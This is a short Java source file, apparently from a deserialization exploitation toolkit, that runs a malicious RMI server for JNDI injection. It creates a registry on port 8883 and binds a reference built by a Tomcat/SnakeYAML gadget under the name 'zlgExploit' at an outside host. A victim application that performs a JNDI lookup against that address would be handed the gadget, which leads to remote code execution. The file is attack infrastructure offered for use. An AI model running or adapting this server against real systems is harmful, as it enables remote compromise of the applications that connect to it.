package xyz.eki.marshalexp.tool;

import com.sun.jndi.rmi.registry.ReferenceWrapper;
import xyz.eki.marshalexp.gadget.jndi.GSnakeYaml;

import javax.naming.Reference;
import java.rmi.Naming;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class SimpleRMIServer {
    public static void main(String[] args) throws  Exception{
        Registry registry = LocateRegistry.createRegistry(8883);
        Reference ref = GSnakeYaml.tomcat_snakeyaml();
        ReferenceWrapper referenceWrapper = new ReferenceWrapper(ref);

        Naming.bind("rmi://buptmerak.cn:8883/zlgExploit",referenceWrapper);
    }
}
